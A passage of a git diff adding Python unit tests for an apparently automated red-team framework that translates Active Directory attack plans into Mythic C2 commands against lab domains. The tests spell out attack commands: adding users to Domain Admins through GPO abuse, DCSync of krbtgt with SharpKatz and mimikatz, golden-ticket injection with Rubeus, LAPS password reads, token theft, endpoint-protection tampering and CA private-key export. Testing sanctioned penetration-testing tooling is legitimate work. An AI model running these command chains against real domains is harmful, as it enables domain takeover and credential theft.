@@ -106,6 +106,79 @@ def test_adapter_translates_structured_artifact_read_for_direct_gpo_plan():
     assert artifact_read.produces == ["artifact:xml_validated"]
 
 
+def test_merlin_adapter_prefers_native_run_net_user_for_gpo_membership_proof():
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=workstation-policy;domain=lab.local;gpo_guid={0A93E998-2599-4DA8-9717-6744993DED3A}",
+        preconditions=["generic-write:gpo:workstation-policy"],
+        effects=["system-exec:gpo:workstation-policy@lab.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "lab.local",
+            "gpo": "workstation-policy",
+            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "command": "cmd.exe",
+        "arguments": r'/c net group "Domain Admins" alice /add /domain',
+        "wait_seconds": 1,
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    artifact_read = mythic_plan.commands[1]
+    assert artifact_read.command == "run"
+    assert artifact_read.parameters == {
+        "executable": "more.com",
+        "arguments": (
+            r"\\lab.local\SYSVOL\lab.local\Policies\{0A93E998-2599-4DA8-9717-6744993DED3A}"
+            r"\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        ),
+    }
+    proof = mythic_plan.commands[-1]
+    assert proof.command == "run"
+    assert proof.parameters == {
+        "executable": "net.exe",
+        "arguments": "user alice /domain",
+    }
+
+
+def test_merlin_adapter_can_encode_quote_bearing_gpo_membership_proof_under_run():
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=workstation-policy;domain=lab.local;gpo_guid={0A93E998-2599-4DA8-9717-6744993DED3A}",
+        preconditions=["generic-write:gpo:workstation-policy"],
+        effects=["system-exec:gpo:workstation-policy@lab.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "lab.local",
+            "gpo": "workstation-policy",
+            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "command": "cmd.exe",
+        "arguments": r'/c net group "Domain Admins" alice /add /domain',
+        "wait_seconds": 1,
+    })
+    config = dict(adapter.MERLIN_MYTHIC_ADAPTER)
+    config.update({
+        "gpo_membership_proof_mode": "net-group",
+        "gpo_membership_proof_transport": "powershell",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)
+
+    assert mythic_plan.ok is True
+    proof = mythic_plan.commands[-1]
+    assert proof.command == "run"
+    assert proof.parameters["executable"] == "powershell.exe"
+    encoded = proof.parameters["arguments"].rsplit(" ", 1)[1]
+    assert base64.b64decode(encoded).decode("utf-16le") == 'net group "Domain Admins" /domain'
+
+
 def test_adapter_preserves_bare_net_group_member_for_gpo_domain_admin_task():
     state = es.EngagementState(
         objective="domain admin",
@@ -281,6 +354,154 @@ def test_adapter_translates_dcsync_plan_to_native_mythic_command():
     assert intent_classifier.classify_tool_call(command.command, command.parameters) == ("dcsync", "lab.local")
 
 
+def test_merlin_adapter_translates_dcsync_plan_to_inprocess_sharpkatz_provider():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local")],
+        hops=[_hop("ds-replication-rights:lab.local")],
+    )
+    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")
+    execution_plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["load-assembly", "invoke-assembly"]
+    setup, invoke = mythic_plan.commands
+    assert setup.parameters == {"filename": "SharpKatz.exe"}
+    assert setup.expected_probe == ""
+    assert invoke.parameters == {
+        "assembly": "SharpKatz.exe",
+        "arguments": "--Command dcsync --User LAB\\krbtgt --Domain lab.local --DomainController dc01.lab.local",
+    }
+    assert invoke.expected_probe == "extract_dcsync_secret_probe"
+
+
+def test_merlin_adapter_config_emits_north_da_forms_and_empty_config_keeps_apollo_defaults():
+    north_plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="gpo-computer-task",
+                parameters={
+                    "tool": "SharpGPOAbuse.exe",
+                    "gpo": "starkwallpaper",
+                    "task_name": "SageTask",
+                    "author": "NT AUTHORITY\\SYSTEM",
+                    "command": "cmd.exe",
+                    "arguments": '/c net group "Domain Admins" samwell.tarly /add /domain',
+                    "force": True,
+                },
+                capability="gpo-controlled-system-exec",
+                purpose="create GPO task",
+                expected_probe="extract_gpo_system_exec_probe",
+            ),
+            capabilities.CapabilityExecutionStep(
+                operation="gpo-immediate-task-fallback",
+                parameters={
+                    "domain": "north.sevenkingdoms.local",
+                    "gpo": "starkwallpaper",
+                    "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
+                    "task_name": "SageTask",
+                    "author": "NT AUTHORITY\\SYSTEM",
+                    "command": "cmd.exe",
+                    "arguments": '/c net group "Domain Admins" samwell.tarly /add /domain',
+                    "proof_path": r"C:\Windows\Temp\sage_gpo_proof.txt",
+                    "ldap_server": "winterfell.north.sevenkingdoms.local",
+                },
+                capability="gpo-controlled-system-exec",
+                purpose="write GPP fallback",
+                expected_probe="extract_gpo_system_exec_probe",
+            ),
+            capabilities.CapabilityExecutionStep(
+                operation="drsuapi-dcsync",
+                parameters={
+                    "domain": "north.sevenkingdoms.local",
+                    "account": "krbtgt",
+                    "dc": "winterfell.north.sevenkingdoms.local",
+                },
+                capability="dcsync-krbtgt",
+                purpose="DCSync krbtgt",
+                expected_probe="extract_dcsync_secret_probe",
+            ),
+        ],
+        reason="north DA adapter contract",
+    )
+
+    merlin = adapter.build_mythic_capability_commands(north_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+    apollo = adapter.build_mythic_capability_commands(north_plan, {})
+
+    assert merlin.ok is True
+    assert [command.command for command in merlin.commands] == [
+        "execute-assembly",
+        "run",
+        "load-assembly",
+        "invoke-assembly",
+    ]
+    assert merlin.commands[0].parameters["filename"] == "SharpGPOAbuse.exe"
+    assert "--AddComputerTask" in merlin.commands[0].parameters["arguments"]
+    assert merlin.commands[1].parameters["executable"] == "powershell.exe"
+    encoded = merlin.commands[1].parameters["arguments"].rsplit(" ", 1)[1]
+    assert "$gpoName = 'starkwallpaper'" in base64.b64decode(encoded).decode("utf-16le")
+    assert merlin.commands[2].parameters == {"filename": "SharpKatz.exe"}
+    assert merlin.commands[2].expected_probe == ""
+    assert merlin.commands[3].parameters == {
+        "assembly": "SharpKatz.exe",
+        "arguments": (
+            "--Command dcsync --User NORTH\\krbtgt --Domain north.sevenkingdoms.local "
+            "--DomainController winterfell.north.sevenkingdoms.local"
+        ),
+    }
+
+    assert apollo.ok is True
+    assert [command.command for command in apollo.commands] == ["execute_assembly", "powerpick", "dcsync"]
+    assert apollo.commands[0].parameters["assembly_name"] == "SharpGPOAbuse.exe"
+    assert "--AddComputerTask" in apollo.commands[0].parameters["assembly_arguments"]
+    assert "$gpoName = 'starkwallpaper'" in apollo.commands[1].parameters
+    assert apollo.commands[2].parameters == {
+        "domain": "north.sevenkingdoms.local",
+        "user": "krbtgt",
+        "dc": "winterfell.north.sevenkingdoms.local",
+    }
+
+    upload_plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="adcs-ca-private-key-dpapi-export",
+                parameters={
+                    "target_host": "ca01",
+                    "target_domain": "lab.local",
+                    "local_account": "administrator",
+                    "password": "CorrectHorseBatteryStaple!",
+                    "callback_id": "8",
+                    "proof_marker": "SAGE_CA_EXPORT_PROOF_ca01_8",
+                    "tool": "SharpDPAPI.exe",
+                    "tool_file_uuid": "sharpdpapi-file-uuid",
+                    "staged_tool_path": r"C:\Windows\Temp\SharpDPAPI.exe",
+                    "output_path": r"C:\Windows\Temp\sage_ca_dpapi_ca01_8.txt",
+                    "wait_seconds": "12",
+                },
+                capability="adcs-ca-private-key-export",
+                purpose="pin upload schema",
+                expected_probe="extract_adcs_ca_private_key_probe",
+            ),
+        ],
+        reason="upload adapter contract",
+    )
+    merlin_upload = adapter.build_mythic_capability_commands(upload_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+    apollo_upload = adapter.build_mythic_capability_commands(upload_plan, {})
+
+    assert merlin_upload.commands[0].parameters == {
+        "file": "sharpdpapi-file-uuid",
+        "path": r"C:\Windows\Temp\SharpDPAPI.exe",
+    }
+    assert apollo_upload.commands[0].parameters == {
+        "File": "sharpdpapi-file-uuid",
+        "Path": r"C:\Windows\Temp\SharpDPAPI.exe",
+    }
+
+
 def test_adapter_can_use_mimikatz_dcsync_fallback_when_configured():
     state = es.EngagementState(
         objective="domain admin",
@@ -305,6 +526,27 @@ def test_adapter_can_use_mimikatz_dcsync_fallback_when_configured():
     assert intent_classifier.classify_tool_call(command.command, command.parameters) == ("dcsync", "lab.local")
 
 
+def test_merlin_adapter_preserves_explicit_mimikatz_dcsync_override():
+    state = es.EngagementState(
+        objective="domain admin",
+        footholds=[_foothold("lab.local")],
+        hops=[_hop("ds-replication-rights:lab.local")],
+    )
+    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")
+    execution_plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})
+    config = dict(adapter.MERLIN_MYTHIC_ADAPTER)
+    config["executor"] = "mimikatz"
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["mimikatz"]
+    assert mythic_plan.commands[0].parameters == {
+        "spawnto": r"C:\Windows\System32\WerFault.exe",
+        "arguments": '"lsadump::dcsync /domain:lab.local /user:LAB\\krbtgt /dc:dc01.lab.local"',
+    }
+
+
 def test_adapter_can_disable_mimikatz_command_quoting():
     state = es.EngagementState(
         objective="domain admin",
@@ -327,7 +569,7 @@ def test_adapter_can_disable_mimikatz_command_quoting():
     }
 
 
-def test_adapter_translates_forge_golden_ticket_to_managed_kerberos_context_sequence():
+def test_adapter_translates_forge_golden_ticket_to_os_native_cross_domain_sequence():
     action = capabilities.CapabilityAction(
         name="forge-golden-ticket",
         target="domain=north.sevenkingdoms.local;target_domain=sevenkingdoms.local",
@@ -350,12 +592,11 @@ def test_adapter_translates_forge_golden_ticket_to_managed_kerberos_context_sequ
     mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
 
     assert mythic_plan.ok is True
-    # Cross-domain forge: child referral -> parent LDAP ticket -> load service ticket -> parent DCSync.
+    # Cross-domain forge: import the child TGT into the current session, then let Windows acquire the parent
+    # referral/service ticket naturally when the parent DCSync proof authenticates.
     assert [command.command for command in mythic_plan.commands] == [
         "shell",
         "shell",
-        "execute_assembly",
-        "execute_assembly",
         "execute_assembly",
         "ticket_cache_purge",
         "ticket_cache_add",
@@ -379,40 +620,32 @@ def test_adapter_translates_forge_golden_ticket_to_managed_kerberos_context_sequ
     assert "/nowrap" in rendered
     assert "/ptt" not in rendered
     assert command.produces == ["kerberos_ticket_base64"]
-    referral = mythic_plan.commands[3]
-    assert referral.parameters["assembly_name"] == "Rubeus.exe"
-    referral_args = referral.parameters["assembly_arguments"]
-    assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
-    assert "/service:krbtgt/sevenkingdoms.local" in referral_args
-    assert "/dc:winterfell.north.sevenkingdoms.local" in referral_args
-    assert referral.deferred is True
-    assert referral.consumes == ["kerberos_ticket_base64"]
-    assert referral.produces == ["kerberos_ticket_base64"]
-    service_ticket = mythic_plan.commands[4]
-    service_ticket_args = service_ticket.parameters["assembly_arguments"]
-    assert service_ticket_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
-    assert "/service:ldap/kingslanding.sevenkingdoms.local" in service_ticket_args
-    assert "/dc:kingslanding.sevenkingdoms.local" in service_ticket_args
-    assert service_ticket.deferred is True
-    assert service_ticket.consumes == ["kerberos_ticket_base64"]
-    assert service_ticket.produces == ["kerberos_ticket_base64"]
-    assert mythic_plan.commands[5].parameters == {
+    assert "asktgs" not in " ".join(
+        str(value)
+        for item in mythic_plan.commands
+        for value in (
+            item.parameters.values()
+            if isinstance(item.parameters, dict)
+            else [item.parameters]
+        )
+    )
+    assert mythic_plan.commands[3].parameters == {
         "all": True,
         "serviceName": "",
         "luid": "",
     }
-    importer = mythic_plan.commands[6]
+    importer = mythic_plan.commands[4]
     assert importer.deferred is True
     assert "kerberos_ticket_base64" in importer.consumes
     assert "kerberos_logon_context" not in importer.consumes
     assert importer.parameters == {"base64ticket": "{{kerberos_ticket_base64}}"}
     assert importer.produces == ["kerberos_ticket_imported"]
-    assert mythic_plan.commands[7].parameters == {
+    assert mythic_plan.commands[5].parameters == {
         "luid": "",
         "getSystemTickets": False,
     }
-    assert mythic_plan.commands[7].consumes == ["kerberos_ticket_imported"]
-    proof = mythic_plan.commands[8]
+    assert mythic_plan.commands[5].consumes == ["kerberos_ticket_imported"]
+    proof = mythic_plan.commands[6]
     assert proof.command == "dcsync"
     assert proof.parameters["domain"] == "sevenkingdoms.local"
     assert proof.parameters["user"] == "SEVENKINGDOMS\\krbtgt"
@@ -422,6 +655,98 @@ def test_adapter_translates_forge_golden_ticket_to_managed_kerberos_context_sequ
         "sid-history-escalation",
         "north.sevenkingdoms.local",
     )
+
+
+def test_adapter_preserves_explicit_asktgs_cross_domain_fallback():
+    action = capabilities.CapabilityAction(
+        name="forge-golden-ticket",
+        target="domain=child.root.local;target_domain=root.local",
+        preconditions=["krbtgt-hash:child.root.local"],
+        effects=["da:root.local"],
+        intent={
+            "capability": "forge-golden-ticket",
+            "domain": "child.root.local",
+            "target_domain": "root.local",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "domain_sid": "S-1-5-21-111-222-333",
+        "aes256": "a" * 64,
+        "extra_sids": ["S-1-5-21-444-555-666-519"],
+        "proof_host": "dc01.root.local",
+        "child_dc": "dc01.child.root.local",
+        "kerberos_ticket_acquisition_strategy": "explicit-asktgs",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands[2:5]] == [
+        "execute_assembly",
+        "execute_assembly",
+        "execute_assembly",
+    ]
+    referral_args = mythic_plan.commands[3].parameters["assembly_arguments"]
+    service_ticket_args = mythic_plan.commands[4].parameters["assembly_arguments"]
+    assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
+    assert "/service:krbtgt/root.local" in referral_args
+    assert service_ticket_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
+    assert "/service:ldap/dc01.root.local" in service_ticket_args
+
+
+def test_merlin_cross_domain_default_uses_current_tgt_import_without_asktgs():
+    action = capabilities.CapabilityAction(
+        name="forge-golden-ticket",
+        target="domain=child.root.local;target_domain=root.local",
+        preconditions=["krbtgt-hash:child.root.local"],
+        effects=["da:root.local"],
+        intent={
+            "capability": "forge-golden-ticket",
+            "domain": "child.root.local",
+            "target_domain": "root.local",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "domain_sid": "S-1-5-21-111-222-333",
+        "aes256": "a" * 64,
+        "extra_sids": ["S-1-5-21-444-555-666-519"],
+        "proof_host": "dc01.root.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == [
+        "run",
+        "ls",
+        "execute-assembly",
+        "run",
+        "load-assembly",
+        "invoke-assembly",
+        "run",
+        "load-assembly",
+        "invoke-assembly",
+    ]
+    assert mythic_plan.commands[4].parameters == {"filename": "Rubeus.exe"}
+    assert mythic_plan.commands[5].parameters == {
+        "assembly": "Rubeus.exe",
+        "arguments": "ptt /ticket:{{kerberos_ticket_base64}}",
+    }
+    assert mythic_plan.commands[7].parameters == {"filename": "SharpKatz.exe"}
+    assert mythic_plan.commands[8].parameters == {
+        "assembly": "SharpKatz.exe",
+        "arguments": "--Command dcsync --User ROOT\\krbtgt --Domain root.local --DomainController dc01.root.local",
+    }
+    rendered = " ".join(
+        str(value)
+        for command in mythic_plan.commands
+        for value in (
+            command.parameters.values()
+            if isinstance(command.parameters, dict)
+            else [command.parameters]
+        )
+    )
+    assert "asktgs" not in rendered
 
 
 def test_cross_domain_dcsync_step_forces_native_executor_over_global_mimikatz_config():
@@ -481,6 +806,146 @@ def test_adapter_translates_current_context_ticket_purge():
     assert command.parameters == "klist purge"
     assert command.consumes == []
     assert command.produces == ["kerberos_current_tickets_purged"]
+
+
+def test_merlin_adapter_uses_native_run_and_ls_for_current_context_proof():
+    plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-ticket-list",
+                parameters={"domain": "lab.local", "target_context": "current", "store": "current"},
+                capability="ensure-kerberos-context",
+                purpose="inventory current Kerberos context",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-ticket-purge",
+                parameters={"domain": "lab.local", "target_context": "current", "store": "current"},
+                capability="ensure-kerberos-context",
+                purpose="purge stale Kerberos tickets",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-service-ticket-acquire",
+                parameters={
+                    "resource": "\\\\dc01.lab.local\\C$",
+                    "target_context": "current",
+                    "store": "current",
+                },
+                capability="ensure-kerberos-context",
+                purpose="acquire current service ticket",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-context-service-proof",
+                parameters={
+                    "resource": "\\\\dc01.lab.local\\C$",
+                    "target_context": "current",
+                    "requires_import": False,
+                    "requires_acquisition": True,
+                },
+                capability="ensure-kerberos-context",
+                purpose="prove current service access",
+                expected_probe="extract_ticket_probe",
+            ),
+        ],
+    )
+
+    mythic_plan = adapter.build_mythic_capability_commands(plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["run", "run", "run", "ls"]
+    assert mythic_plan.commands[0].parameters == {
+        "executable": "klist.exe",
+        "arguments": "",
+    }
+    assert mythic_plan.commands[1].parameters == {
+        "executable": "klist.exe",
+        "arguments": "purge",
+    }
+    assert mythic_plan.commands[2].parameters == {
+        "executable": "klist.exe",
+        "arguments": "get cifs/dc01.lab.local",
+    }
+    assert mythic_plan.commands[2].consumes == ["kerberos_current_tickets_purged"]
+    assert mythic_plan.commands[2].produces == ["kerberos_service_ticket_acquired"]
+    assert mythic_plan.commands[3].parameters == {"path": "\\\\dc01.lab.local\\C$"}
+    assert mythic_plan.commands[3].consumes == [
+        "kerberos_context_inventory",
+        "kerberos_service_ticket_acquired",
+    ]
+
+
+def test_merlin_adapter_uses_rubeus_ptt_for_current_agent_cache_import():
+    plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-ticket-purge",
+                parameters={"domain": "lab.local", "target_context": "current", "store": "agent-cache"},
+                capability="forge-golden-ticket",
+                purpose="purge current ticket cache",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-ticket-import",
+                parameters={
+                    "domain": "lab.local",
+                    "target_context": "current",
+                    "store": "agent-cache",
+                    "ticket_base64": "{{kerberos_ticket_base64}}",
+                },
+                capability="forge-golden-ticket",
+                purpose="import ticket into current cache",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-ticket-list",
+                parameters={"domain": "lab.local", "target_context": "current", "store": "agent-cache"},
+                capability="forge-golden-ticket",
+                purpose="inventory current ticket cache",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+        ],
+    )
+
+    mythic_plan = adapter.build_mythic_capability_commands(plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["run", "load-assembly", "invoke-assembly", "run"]
+    assert mythic_plan.commands[0].parameters == {"executable": "klist.exe", "arguments": "purge"}
+    assert mythic_plan.commands[1].parameters == {"filename": "Rubeus.exe"}
+    importer = mythic_plan.commands[2]
+    assert importer.parameters == {
+        "assembly": "Rubeus.exe",
+        "arguments": "ptt /ticket:{{kerberos_ticket_base64}}",
+    }
+    assert importer.deferred is True
+    assert importer.consumes == ["kerberos_ticket_base64"]
+    assert importer.produces == ["kerberos_ticket_imported"]
+    assert mythic_plan.commands[3].parameters == {"executable": "klist.exe", "arguments": ""}
+
+
+def test_adapter_preserves_generic_operation_on_translated_commands():
+    plan = capabilities.CapabilityExecutionPlan(
+        True,
+        steps=[
+            capabilities.CapabilityExecutionStep(
+                operation="kerberos-ticket-purge",
+                parameters={"domain": "lab.local", "target_context": "current", "store": "current"},
+                capability="ensure-kerberos-context",
+                purpose="purge stale Kerberos tickets",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+        ],
+    )
+
+    mythic_plan = adapter.build_mythic_capability_commands(plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert mythic_plan.commands[0].command == "run"
+    assert mythic_plan.commands[0].operation == "kerberos-ticket-purge"
 
 
 def test_adapter_translates_inter_realm_referral_to_deferred_asktgs():
@@ -637,6 +1102,61 @@ def test_adapter_translates_account_context_to_managed_asktgt_sequence_without_p
     assert mythic_plan.commands[6].consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]
 
 
+def test_merlin_adapter_translates_account_context_through_applied_token_session():
+    action = capabilities.CapabilityAction(
+        name="ensure-account-kerberos-context",
+        target="domain=lab.local;account=alice;callback=13",
+        preconditions=["creds:alice@lab.local", "live-callback:13"],
+        effects=["kerberos-account-context:alice@lab.local@callback:13"],
+        intent={
+            "capability": "ensure-account-kerberos-context",
+            "domain": "lab.local",
+            "account": "alice",
+            "callback_id": "13",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "aes256": "d" * 64,
+        "proof_host": "dc01.lab.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == [
+        "run",
+        "ls",
+        "execute-assembly",
+        "make_token",
+        "load-assembly",
+        "invoke-assembly",
+        "invoke-assembly",
+        "ls",
+    ]
+    assert mythic_plan.commands[3].parameters == {
+        "user": "lab.local\\alice",
+        "pass": "SageNetOnlyContext1!",
+    }
+    importer = mythic_plan.commands[5]
+    assert importer.parameters == {
+        "assembly": "Rubeus.exe",
+        "arguments": "ptt /ticket:{{kerberos_ticket_base64}}",
+    }
+    assert importer.consumes == ["kerberos_ticket_base64", "kerberos_logon_context"]
+    assert importer.produces == ["kerberos_ticket_imported"]
+    inventory = mythic_plan.commands[6]
+    assert inventory.parameters == {
+        "assembly": "Rubeus.exe",
+        "arguments": "klist",
+    }
+    assert inventory.consumes == ["kerberos_logon_context"]
+    assert inventory.produces == ["kerberos_context_inventory"]
+    assert [command.command for command in mythic_plan.commands].count("load-assembly") == 1
+    proof = mythic_plan.commands[7]
+    assert proof.parameters == {"path": "\\\\dc01.lab.local\\SYSVOL"}
+    assert proof.consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]
+
+
 def test_adapter_can_translate_service_proof_to_native_path_command():
     step = capabilities.CapabilityExecutionStep(
         operation="kerberos-context-service-proof",
@@ -744,6 +1264,53 @@ def test_adapter_translates_managed_secret_read_to_directory_searcher():
     assert "ms-Mcs-AdmPwd" in rendered
     assert "msLAPS-Password" in rendered
     assert "dNSHostName=ws01.child.lab.local" in rendered
+
+
+def test_merlin_adapter_translates_managed_secret_read_to_inprocess_sharpview():
+    action = capabilities.CapabilityAction(
+        name="read-managed-local-admin-secret",
+        target="account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13",
+        preconditions=["kerberos-account-context:alice@lab.local@callback:13"],
+        effects=["managed-local-admin-secret:ws01@child.lab.local"],
+        intent={
+            "capability": "read-managed-local-admin-secret",
+            "account": "alice",
+            "account_domain": "lab.local",
+            "target_host": "ws01",
+            "target_domain": "child.lab.local",
+            "callback_id": "13",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "domain_controller": "dc01.child.lab.local",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["load-assembly", "invoke-assembly"]
+    load, invoke = mythic_plan.commands
+    assert load.parameters == {"filename": "SharpView.exe"}
+    assert load.expected_probe == ""
+    assert load.produces == []
+    assert load.consumes == []
+    assert invoke.parameters["assembly"] == "SharpView.exe"
+    rendered = invoke.parameters["arguments"]
+    assert rendered.startswith("Get-DomainComputer ")
+    assert "-Identity ws01.child.lab.local" in rendered
+    assert "-Domain child.lab.local" in rendered
+    assert "-Server dc01.child.lab.local" in rendered
+    assert "-SearchBase DC=child,DC=lab,DC=local" in rendered
+    assert (
+        "-Properties "
+        "ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime,msLAPS-Password,"
+        "msLAPS-EncryptedPassword,msLAPS-PasswordExpirationTime,"
+        "distinguishedName,dNSHostName,sAMAccountName"
+    ) in rendered
+    assert rendered.endswith(" -FindOne")
+    assert invoke.expected_probe == "extract_managed_local_admin_secret_probe"
+    assert invoke.produces == ["managed_local_admin_secret_probe"]
+    assert invoke.consumes == ["kerberos_account_context"]
 
 
 def test_adapter_translates_local_admin_use_to_make_token_and_admin_share_proof():
@@ -950,6 +1517,36 @@ def test_adapter_translates_remote_execution_to_merlin_powershell_wmi_sequence()
     assert remote.produces == ["remote_process_created", "remote_execution_proof"]
 
 
+def test_merlin_profile_resets_stale_token_before_explicit_credential_remote_execution():
+    action = capabilities.CapabilityAction(
+        name="execute-as-local-admin",
+        target="target=ws01;target_domain=child.lab.local;callback=8",
+        preconditions=["local-admin:ws01@child.lab.local", "live-callback:8"],
+        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
+        intent={
+            "capability": "execute-as-local-admin",
+            "target_host": "ws01",
+            "target_domain": "child.lab.local",
+            "callback_id": "8",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "password": "CorrectHorseBatteryStaple!",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["rev2Self", "run"]
+    reset, remote = mythic_plan.commands
+    assert reset.parameters == {}
+    assert reset.expected_probe == ""
+    assert "stored impersonation token" in reset.purpose
+    assert remote.parameters["executable"] == "powershell.exe"
+    assert remote.expected_probe == "extract_remote_execution_probe"
+    assert remote.produces == ["remote_process_created", "remote_execution_proof"]
+
+
 def test_adapter_translates_remote_execution_to_merlin_make_token_sequence():
     action = capabilities.CapabilityAction(
         name="execute-as-local-admin",
@@ -968,12 +1565,9 @@ def test_adapter_translates_remote_execution_to_merlin_make_token_sequence():
     })
 
     mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
-        "local_admin_remote_exec_command": "run",
+        **adapter.MERLIN_MYTHIC_ADAPTER,
         "native_remote_exec_method": "make-token",
         "revert_command": "rev2Self",
-        "remote_file_read_command": "download",
-        "remote_file_read_path_param": "file",
-        "suppress_remote_file_read": True,
     })
 
     assert mythic_plan.ok is True
@@ -1097,6 +1691,39 @@ def test_adapter_translates_endpoint_protection_adjustment_to_apollo_powerpick()
     assert "$pid=" not in command.parameters
 
 
+def test_merlin_profile_resets_stale_token_before_remote_endpoint_adjustment():
+    action = capabilities.CapabilityAction(
+        name="endpoint-protection-adjustment",
+        target="target=ca01;target_domain=lab.local;callback=14",
+        preconditions=[
+            "remote-exec:ca01@lab.local",
+            "local-admin:ca01@lab.local",
+            "live-callback:14",
+        ],
+        effects=["endpoint-protection-adjusted:ca01@lab.local"],
+        intent={
+            "capability": "endpoint-protection-adjustment",
+            "target_host": "ca01",
+            "target_domain": "lab.local",
+            "callback_id": "14",
+        },
+    )
+    execution_plan = capabilities.build_capability_execution_plan(action, {
+        "method": "remote-wmi",
+        "password": "Correct Horse 'Battery' Staple!",
+    })
+
+    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)
+
+    assert mythic_plan.ok is True
+    assert [command.command for command in mythic_plan.commands] == ["rev2Self", "run"]
+    reset, command = mythic_plan.commands
+    assert reset.parameters == {}
+    assert reset.expected_probe == ""
+    assert command.parameters["executable"] == "powershell.exe"
+    assert command.expected_probe == "extract_endpoint_protection_probe"
+
+
 def test_adapter_translates_adcs_ca_private_key_export_to_merlin_powershell_wmi():
     action = capabilities.CapabilityAction(
         name="adcs-ca-private-key-export",
@@ -1143,6 +1770,42 @@ def test_adapter_translates_adcs_ca_private_key_export_to_merlin_powershell_wmi(
     assert "SAGE_CA_EXPORT_PROOF_ca01_8" in ps
     assert "CA_EXPORT_STATUS=OK" in ps
     assert "PFX_BASE64=" in ps
+
+
+def test_merlin_profile_resets_stale_token_before_adcs_ca_private_key_export():
+    action = capabilities.CapabilityAction(
+        name="adcs-ca-private-key-export",
